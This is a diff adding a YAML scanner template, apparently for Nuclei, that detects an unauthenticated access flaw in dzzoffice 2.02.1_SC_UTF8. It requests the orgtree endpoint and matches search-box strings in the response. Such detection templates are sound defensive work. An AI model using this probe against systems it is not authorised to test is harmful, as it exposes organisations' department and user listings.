@@ -1,0 +1,29 @@
+id: dzzoffice-2-02-1-sc-utf8-unauth
+
+info:
+  name: dzzoffice 2.02.1_SC_UTF8 存在未授权访问漏洞
+  author: xiaohe
+  severity: medium
+  description: dzzoffice 2.02.1_SC_UTF8 存在未授权访问漏洞
+  reference:
+    - https://www.zilyun.com/42666.html
+  tags: unauth,dzzoffice
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?mod=system&op=orgtree"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'title="关闭搜索框"'
+          - '<input id="jstree_search_input" type="text" placeholder="搜索部门或用户"'
+        condition: and
+        
+      - type: status
+        status:
+          - 200
+
